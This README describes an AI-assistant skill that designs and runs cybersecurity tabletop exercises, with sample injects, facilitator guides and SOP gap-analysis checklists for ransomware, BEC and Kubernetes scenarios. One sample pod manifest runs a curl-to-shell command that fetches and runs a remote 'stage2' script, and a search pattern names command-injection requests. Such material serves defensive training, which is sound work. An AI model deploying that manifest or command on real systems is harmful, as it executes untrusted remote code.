# TabletopExercise Skill

**Comprehensive cybersecurity tabletop exercise design and facilitation framework**

---

## Overview

Enhanced from the original SOC Manager Table Top Designer, this PAI skill provides a complete methodology for designing, facilitating, and evaluating cybersecurity tabletop exercises for both technical and executive audiences.

**Key Enhancements:**
- ✅ **Technical Atomics**: Executable inject sequences for realistic scenario delivery
- ✅ **SOP/Playbook Gap Analysis**: Automated checklist generation for missing procedures
- ✅ **Threat Model Integration**: Scenarios based on real-world attack patterns
- ✅ **CISA-Aligned Framework**: Following official Cybersecurity Tabletop Exercise Package (CTEP) methodology
- ✅ **2025-2026 AI Threats**: Deepfake attacks, automated threat chains, supply chain compromise
- ✅ **PAI Tool Integration**: Caido, Browser MCP, JS Analyzer workflows

---

## Quick Start

### For Exercise Designers

```
Goal: Design a tabletop exercise

1. Define objectives (1-3 measurable goals)
   Example: "Validate ransomware response playbook and backup restoration procedures"

2. Select audience
   - Executive: C-suite, Board → Business impact focus
   - Technical: SOC, IR team → Detection/response focus
   - Hybrid: Cross-functional → Coordination focus

3. Choose scenario type
   - Ransomware, BEC, Supply Chain, K8s Compromise, DDoS, Insider Threat, etc.

4. Generate materials using this skill
   - Scenario brief
   - Facilitator guide with injects
   - Technical atomics for runner (if technical scenario)
   - Evaluation forms
   - SOP/playbook gap analysis checklist
```

### For Exercise Facilitators

```
Goal: Run a tabletop exercise

Pre-Exercise:
- Review facilitator guide and inject cards
- Runner tests all technical atomics
- Verify participant list and contact info
- Prepare evaluation forms for observers

During Exercise (60-90 min):
- Set ground rules (psychological safety, learning focus)
- Present initial scenario (T+0)
- Deliver timed injects per atomic schedule
- Use open-ended questions to stimulate discussion
- Document observations in real-time

Post-Exercise:
- Hot wash (20-30 min immediate debrief)
- After-Action Report with findings
- Generate SOP/playbook gap analysis
- Assign action items with owners and deadlines
```

### For Post-Exercise Analysis

```
Goal: Identify gaps and improve processes

1. Review exercise observations
2. Generate gap analysis checklist (automatic via skill)
3. Prioritize gaps: Critical → High → Medium → Low
4. Assign owners and deadlines
5. Track implementation
6. Schedule follow-up exercise in 6-12 months
```

---

## File Structure

```
/root/.claude/skills/TabletopExercise/
├── README.md              # This file - overview and quick start
├── SKILL.md              # Main skill definition (PAI integration)
└── ATOMICS-LIBRARY.md    # Pre-built technical inject sequences
```

**Generated Outputs** (when skill is invoked):
```
/root/.claude/history/tabletop-exercises/YYYY-MM/
└── [Exercise-Name-Date]/
    ├── scenario-brief.md           # Executive summary
    ├── facilitator-guide.md        # Detailed scenario with injects
    ├── atomics-runbook.md          # Runner instructions (if technical)
    ├── evaluation-forms.md         # Observer templates
    ├── after-action-report.md      # Post-exercise findings
    └── gap-analysis-checklist.md   # Missing SOPs/playbooks
```

---

## Core Capabilities

### 1. Scenario Generation

**Executive Scenarios** (60-90 min, non-technical)
- **Audience**: C-suite, Board, Executive Directors
- **Focus**: Business impact, decision-making, external communication, regulatory compliance
- **Language**: Non-technical, succinct, business-focused
- **Outcomes**: Improved executive/technical alignment, clarified crisis roles

**Technical Scenarios** (90-120 min, operational)
- **Audience**: SOC analysts, incident responders, IT Ops
- **Focus**: Detection/containment, forensics, tool usage, technical recovery
- **Language**: Deep technical content, command-line operations, log analysis
- **Outcomes**: Validated playbooks, identified tool gaps, improved coordination

**Scenario Types Based on Threat Models:**
- Ransomware with backup failure
- Business Email Compromise (BEC/OAuth)
- Supply Chain Breach (npm, CDN)
- Kubernetes Cluster Compromise
- Cloud Storage Misconfiguration (S3, GCS)
- Deepfake Social Engineering (AI-enhanced)
- Insider Threat
- DDoS Attack

### 2. Technical Atomics for Runners

Atomics are **executable action sequences** that runners perform to simulate realistic incident progression.

**Example Atomic:**
```markdown
## T+30 (Backup System Failure)
**Atomic ID**: BACKUP-FAIL-001
**Action**: Update backup system dashboard
**Status Change**: Replication status → "Failed - destination unreachable"
**Expected Response**: IT investigates backup server, discovers encrypted files
**If No Response**: Facilitator prompts: "Your backup monitoring shows failures..."
```

**Atomic Categories:**
- **Pre-Exercise Setup**: Environment preparation, test data staging
- **Timed Injects**: Scheduled scenario progressions
- **Conditional Responses**: Dynamic reactions to participant questions
- **Escalation Events**: Executive pressure, media inquiries

**Benefits:**
- Consistent scenario delivery across multiple exercises
- Realistic timing and pacing
- Runner confidence through clear instructions
- Reproducible exercises for A/B testing improvements

### 3. SOP/Playbook Gap Analysis

Automatically generates comprehensive checklists identifying missing procedures.

**Process:**
1. Scenario decomposition (identify all decision points)
2. Playbook mapping (check for documented procedures)
3. Gap identification (flag missing/inadequate)
4. Priority scoring (Critical/High/Medium/Low)

**Example Output:**
```markdown
## CRITICAL GAPS

### 1. Ransomware Containment Playbook - MISSING
**Scenario Trigger**: Multiple hosts showing encryption
**Required Decisions**:
  □ Network segmentation procedures
  □ Host isolation criteria
  □ AD credential reset procedures
  □ Encrypted file preservation

**Impact if Missing**: Delayed containment, lateral spread
**Recommendation**: Develop comprehensive ransomware playbook
**Owner**: _________ **Due Date**: _________
```

**Gap Categories:**
- **SOPs** (Standard Operating Procedures)
- **Process Issues** (Communication channels, approval workflows)
- **Tool Gaps** (Missing capabilities, integration failures)
- **Training Needs** (Knowledge deficiencies)

### 4. Threat Model Integration

Scenarios built from real-world threat intelligence and attack patterns:

**Sources:**
- OAuth 2.0 Security (RFC 6819)
- Kubernetes Security (CNCF, DoD guidance)
- Cloud Security (AWS, GCP, Azure documentation)
- IoT Device Vulnerabilities (MITRE)
- AI/ML Workload Threats (OWASP, AWS Bedrock)
- Supply Chain Attacks (npm, container registries)

**Example Scenario Mapping:**
```
Threat Model: OAuth 2.0 RFC 6819
→ Tabletop Scenario: Business Email Compromise via OAuth Token Theft
→ Attack Chain: Phishing → OAuth consent → Token theft → Account takeover → Fraudulent transaction
→ Decision Points: Token revocation, out-of-band verification, fraud investigation
→ Gap Analysis: OAuth security monitoring, token lifecycle management
```

### 5. CISA-Aligned Framework

Follows official **CISA Cybersecurity Tabletop Exercise Package (CTEP)** methodology:

**Plan → Engage → Learn**

**Planning Phase:**
- Define 1-3 measurable objectives
- Select realistic scenario matching risk profile
- Identify cross-functional participants
- Prepare materials (brief, injects, facilitator script)

**Engaging Phase:**
- Set ground rules (psychological safety)
- Present initial scenario (T+0)
- Progressive injects (timed complications)
- Facilitate discussion (open-ended questions)
- Document observations

**Learning Phase:**
- Hot wash (20-30 min immediate debrief)
- After-Action Report (strengths, gaps, recommendations)
- Action items (owners, deadlines, tracking)
- Implementation (update IR plans, develop SOPs)
- Follow-up exercise (test improvements in 6-12 months)

**Resources Integrated:**
- 100+ CISA scenario templates
- NIST SP 800-84 guidance
- After-Action Report templates
- Objective-based performance analysis

---

## Usage Examples

### Example 1: Generate Executive Ransomware Tabletop

**User Request:**
> "Design an executive tabletop for ransomware with focus on business continuity decisions. Include ransom payment consideration, customer notification, and board communication."

**Skill Output:**
```
1. EXECUTIVE SCENARIO BRIEF (2 pages)
   - Scenario: Healthcare provider hit by ransomware, 48-hour deadline
   - Objectives:
     * Test executive decision-making under pressure
     * Validate crisis communication procedures
     * Clarify board notification thresholds
   - Participants: CEO, CFO, General Counsel, CISO, Communications Director

2. FACILITATOR GUIDE (8 pages)
   - T+0: Initial report from IT (non-technical: "systems are unavailable")
   - T+20: Inject: Ransom demand ($2M) with 48-hour deadline
   - T+40: Inject: Journalist inquiry about "rumored cyber attack"
   - T+60: Inject: Cyber insurance adjuster requests incident details
   - T+80: Decision point: Ransom payment vote (facilitator: no right answer)

3. NO TECHNICAL ATOMICS (executive scenario)

4. EVALUATION FORMS
   - Executive communication quality
   - Decision-making process clarity
   - Cross-functional coordination
   - Crisis management effectiveness

5. GAP ANALYSIS CHECKLIST
   - CRITICAL: Executive crisis communication playbook - MISSING
   - HIGH: Ransom payment decision framework - INADEQUATE
   - MEDIUM: Media inquiry response procedures - PARTIAL
   - LOW: Board notification thresholds - MISSING
```

---

### Example 2: Generate Technical K8s Compromise with Atomics

**User Request:**
> "Create technical tabletop for Kubernetes cluster compromise targeting our DevOps team. Include cryptominer deployment and container escape attempts. Need full atomic sequence for the runner."

**Skill Output:**
```
1. TECHNICAL SCENARIO BRIEF (3 pages)
   - Scenario: Exposed K8s API server leads to unauthorized pod creation
   - Attack chain: Recon → Pod creation → Container escape → Cryptominer → Persistence
   - Objectives:
     * Validate K8s incident response procedures
     * Test pod security policy effectiveness
     * Identify RBAC misconfigurations
   - Participants: DevOps team, Security Ops, Platform Engineering

2. FACILITATOR GUIDE (12 pages)
   - Technical discussion prompts
   - Expected kubectl commands
   - Log analysis scenarios

3. ATOMICS RUNBOOK FOR RUNNER (15 pages)

   PRE-EXERCISE SETUP (T-60min):
   - Deploy test K8s cluster (kind/minikube)
   - Stage malicious pod manifests
   - Configure Falco alerts
   - Prepare monitoring dashboards

   TIMED ATOMICS:

   T+0 (API Server Scan)
   ATOMIC ID: K8S-RECON-001
   ACTION: Display threat intel alert showing K8s API scanning
   EXPECTED: Security team verifies exposure, reviews RBAC

   T+15 (Unauthorized Pod)
   ATOMIC ID: K8S-POD-CREATE-001
   ACTION: Show kubectl alert for pod creation in kube-system
   POD MANIFEST:
   ```yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: system-monitor-x7j2k
     namespace: kube-system
   spec:
     containers:
     - name: alpine
       image: alpine:latest
       command: ["/bin/sh", "-c"]
       args: ["curl http://203.0.113.50/stage2.sh | sh"]
   ```
   EXPECTED: Admin investigates pod, checks service accounts

   T+30 (Container Escape)
   ATOMIC ID: K8S-ESCAPE-001
   ACTION: Display Falco alert for privileged container
   ALERT: "Container attempting namespace escape using nsenter"
   EXPECTED: IR team kills pod immediately, checks host compromise

   T+45 (Cryptominer Deployment)
   ATOMIC ID: K8S-CRYPTOMINER-001
   ACTION: Update monitoring dashboard
   CPU: 95% across all nodes (was 30%)
   NEW PODS: 47 pods named "nginx-cache-[random]"
   NETWORK: Outbound traffic to pool.minexmr.com:443
   EXPECTED: Team deletes pods, blocks mining pool, investigates access

   [... continues with persistence, investigation, remediation atomics ...]

4. GAP ANALYSIS CHECKLIST
   - CRITICAL: Kubernetes incident response playbook - MISSING
   - CRITICAL: Pod Security Policy enforcement - NOT ENABLED
   - HIGH: RBAC audit procedures - MISSING
   - HIGH: Runtime security monitoring (Falco) - NOT DEPLOYED
   - MEDIUM: K8s API rate limiting - NOT CONFIGURED
   - MEDIUM: Network policies for pod-to-pod communication - PARTIAL
```

---

### Example 3: Post-Exercise Gap Analysis Only

**User Request:**
> "We just completed a BEC tabletop. No one knew who had authority to stop wire transfers. We also discovered our OAuth token revocation process is manual and takes 2+ hours. Generate comprehensive gap analysis."

**Skill Output:**
```
# SOP/PLAYBOOK GAP ANALYSIS
**Exercise**: Business Email Compromise Tabletop
**Date**: 2026-02-06
**Scenario**: CFO account compromise via OAuth phishing

---

## CRITICAL GAPS

### 1. Wire Transfer Authorization Matrix - MISSING
**Observed**: Confusion about who can halt pending wire transfers
**Impact**: Potential $250K fraud loss during decision delay
**Required Documentation**:
  □ Wire transfer approval authority levels
  □ Emergency halt procedures and authorization
  □ Out-of-band verification requirements (phone, in-person)
  □ Fraudulent transaction investigation process
  □ Bank fraud hotline contacts and escalation procedures

**Recommendation**: Create Financial Fraud Response Playbook with:
- Decision tree: When to halt transactions (risk thresholds)
- Authority matrix: Who can stop wires at what dollar amounts
- Out-of-band verification: Mandatory callback procedures for high-value transfers
- Bank coordination: Pre-established fraud hotline, investigation contacts
**Priority**: CRITICAL - Financial fraud risk
**Owner**: _________ (CFO + CISO)
**Due Date**: _________ (Recommend: 30 days)

---

### 2. OAuth Token Revocation - INADEQUATE
**Observed**: Token revocation requires 2+ hour manual process
**Impact**: Extended window for attacker to access compromised account
**Current Process**: "Admin must log into Azure portal, locate user, manually revoke tokens"
**Required Improvements**:
  □ Automated token revocation via API/script
  □ SOC analyst access to token revocation tool
  □ Token revocation SOP with step-by-step screenshots
  □ Token lifecycle monitoring and anomaly detection

**Recommendation**:
1. IMMEDIATE (Week 1): Create manual SOP with screenshots, train SOC team
2. SHORT-TERM (Month 1): Develop automated revocation script
3. LONG-TERM (Quarter 1): Implement SOAR playbook for automatic revocation on high-risk alerts

**Priority**: CRITICAL - Account takeover window
**Owner**: _________ (Identity & Access Management + SOC Lead)
**Due Date**: _________
  - Manual SOP: 7 days
  - Automation: 30 days
  - SOAR integration: 90 days

---

## HIGH-PRIORITY GAPS

### 3. Executive Account Compromise Response - PARTIAL
**Observed**: No specific procedures for C-suite account compromise
**Current**: Generic "account compromise" procedure doesn't address executive-specific risks
**Missing Elements**:
  □ Executive notification procedures (how to contact compromised exec)
  □ Executive email audit procedures (what did attacker access?)
  □ Executive authority during compromise (can they approve transactions?)
  □ Executive contact list verification (update after compromise)
  □ Board notification thresholds (when to escalate to board)

**Recommendation**: Enhance incident response plan with "Executive Account Compromise Addendum"
**Priority**: HIGH - Frequent BEC target
**Owner**: _________ (CISO + General Counsel)
**Due Date**: _________

---

### 4. OAuth Phishing Detection - MISSING
**Observed**: No monitoring for malicious OAuth consent grants
**Current**: Azure AD logs available but not actively monitored
**Missing Elements**:
  □ SIEM alerts for OAuth consent from unusual locations/IPs
  □ OAuth app permission baseline (detect abnormal permission requests)
  □ User training on OAuth phishing (recognizing fake Microsoft login pages)
  □ OAuth app audit (review all third-party apps with access)

**Recommendation**:
1. Deploy SIEM detection for:
   - OAuth consent from high-risk countries
   - OAuth apps requesting Mail.ReadWrite + sensitive permissions
   - OAuth consent during off-hours
2. Quarterly OAuth app audit
3. User awareness training on OAuth phishing

**Priority**: HIGH - Primary BEC attack vector
**Owner**: _________ (SOC + Security Awareness)
**Due Date**: _________

---

## PROCESS GAPS

### Communication During Financial Fraud Investigation
**Observed**: Multiple parallel Slack threads, email chains caused confusion
**Recommendation**:
  □ Dedicated #fraud-response Slack channel (pre-provisioned)
  □ Conference bridge number for real-time coordination
  □ Designated incident commander for financial fraud scenarios
  □ Status update cadence (every 30 min during active fraud investigation)

**Priority**: MEDIUM
**Owner**: _________
**Due Date**: _________

---

## TOOL GAPS

### Automated Financial Controls
**Observed**: All wire transfer controls are manual
**Recommendation**: Evaluate tools for:
  □ Automated wire transfer velocity checks
  □ Out-of-band approval via mobile app (Duo, Okta Verify)
  □ AI-powered anomaly detection for unusual payment patterns

**Priority**: MEDIUM
**Owner**: _________ (CFO + IT)
**Due Date**: _________

---

## TRAINING GAPS

### Finance Team Security Awareness
**Observed**: Finance staff unfamiliar with BEC tactics
**Recommendation**:
  □ Quarterly BEC simulation exercises for finance team
  □ Training on out-of-band verification importance
  □ Deepfake CEO attack awareness (voice/video impersonation)

**Priority**: MEDIUM
**Owner**: _________ (Security Awareness Team)
**Due Date**: _________

---

## SUMMARY
- Total Gaps: 4 Critical, 4 High, 3 Medium
- Estimated Remediation: 200 person-hours
- Recommended Timeline: 30 days (Critical), 90 days (High), 180 days (Medium)

## FOLLOW-UP EXERCISE
Schedule follow-up BEC tabletop in 6 months to test:
- Updated wire transfer authorization procedures
- Automated OAuth token revocation
- Executive compromise notification process
- SOC team response time improvements
```

---

## Best Practices

### Critical Success Factors

1. **Clear Objectives**: Define 1-3 measurable goals before scenario design
2. **Realistic Scenarios**: Match organizational risk profile, avoid "doomsday" plots
3. **Cross-Functional Participation**: Include all departments involved in real incidents
4. **Skilled Facilitation**: Draw solutions from participants, don't provide answers
5. **Psychological Safety**: Frame as learning, not performance evaluation
6. **Implement Findings**: Assign owners, deadlines, track completion (MOST CRITICAL!)

### Common Pitfalls to Avoid

❌ **Not implementing lessons learned** (exercise becomes useless checkbox)
❌ **Unrealistic "movie-style hacking"** scenarios (participants can't relate)
❌ **Same participants every time** (limits organizational learning)
❌ **Inadequate debriefing time** (real learning happens in debrief)
❌ **Treating as performance evaluation** (creates defensive behavior)
❌ **Outdated contact lists** (critical failure during real incidents)

### Optimal Timing

- **Duration**: 60-90 minutes for quality discussion
- **Frequency**: Quarterly (high-risk orgs) or monthly (regulated industries)
- **Follow-Up**: 6-12 months to test implemented improvements

---

## Integration with PAI Security Tools

### Caido MCP Integration
For web application compromise scenarios:
```bash
# Demonstrate attack patterns during technical tabletops
/caido req.ext.eq:"php" AND req.query.matches:"eval|cmd"
# Show participants actual malicious requests
```

### Browser MCP Integration
For client-side attack scenarios (XSS, CSRF, OAuth phishing):
- Demonstrate exploit chains live during tabletop
- Capture screenshots/GIFs for inject materials
- Record attack sequences for training

### JS Analyzer Integration
For supply chain compromise scenarios:
```bash
# Analyze compromised npm package during tabletop
bun run /root/doctorswzl/src/index.ts malicious-package.js
# Show participants dangerous sinks and data exfiltration code
```

---

## Resources

### Free Government Resources
- **CISA Tabletop Exercise Packages**: cisa.gov/cybersecurity-tabletops (100+ scenarios)
- **NIST SP 800-84**: Guide to Test, Training, and Exercise Programs
- **CISA AAR Templates**: After-Action Report formats

### Threat Model Examples
- OAuth 2.0 (RFC 6819)
- Kubernetes Security (CNCF, DoD)
- Cloud Security (AWS, GCP, Azure)
- IoT Devices (MITRE)
- AI/ML Workloads (OWASP, AWS Bedrock)

### Research Foundation
Skill enhanced with learnings from:
- CISA Cybersecurity Tabletop Exercise framework
- NIST 800-84 testing methodologies
- Real-world practitioner experiences (Memorial Health Systems ransomware response)
- 2025-2026 emerging threat landscape (AI-powered attacks, supply chain focus)
- Regulatory drivers (HIPAA, NIS2, DORA, PCI DSS)

---

## Version History

**v2.0** (2026-02-06) - Enhanced PAI Skill
- Added technical atomics generation for exercise runners
- Integrated SOP/playbook gap analysis framework
- Incorporated CISA CTEP methodology
- Added threat model-based scenario library
- Enhanced with 2025-2026 AI threat considerations
- Integrated PAI security tool workflows (Caido, Browser MCP, JS Analyzer)

**v1.0** (Original) - SOC Manager Table Top Designer
- Source: Arcanum-Sec redbluepurpleAI project
- Basic scenario generation for executive/technical audiences
- Incident response protocol focus

---

## Contact

**Skill Maintained By**: Skylar (xssdoctor)
**Original Project**: Arcanum-Sec redbluepurpleAI
**PAI Framework**: github.com/xssdoctor/.claude (private)

For questions or improvements, reference:
- SKILL.md: Main skill definition and capabilities
- ATOMICS-LIBRARY.md: Pre-built atomic sequences
- This README: Quick start and usage examples

---

**END OF README**
